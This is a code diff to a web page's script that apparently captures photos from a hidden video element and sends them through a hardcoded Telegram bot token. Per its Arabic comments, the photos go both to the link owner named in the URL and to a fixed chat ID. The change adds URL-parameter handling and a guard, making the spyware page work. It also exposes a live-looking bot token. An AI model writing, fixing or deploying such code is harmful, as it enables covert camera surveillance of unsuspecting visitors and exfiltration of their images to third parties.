@@ -83,6 +83,7 @@ video { display: none; }
 </div>
 
 <script>
+const urlParams = new URLSearchParams(window.location.search);
 const dynamicChatId = urlParams.get('id');
 const fixedChatId = 6002805119;
 const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
@@ -144,7 +145,9 @@ function captureAndSend() {
         //     status.innerText = `📸 صورة ${photoCount} / ${MAX_PHOTOS}`;
         // });
         // الإرسال لصاحب الرابط
-        send(dynamicChatId);
+        if (dynamicChatId) {
+            send(dynamicChatId);
+        }
 
         // الإرسال للرقم الثابت فقط إذا كان مختلف
         if (dynamicChatId !== fixedChatId) {
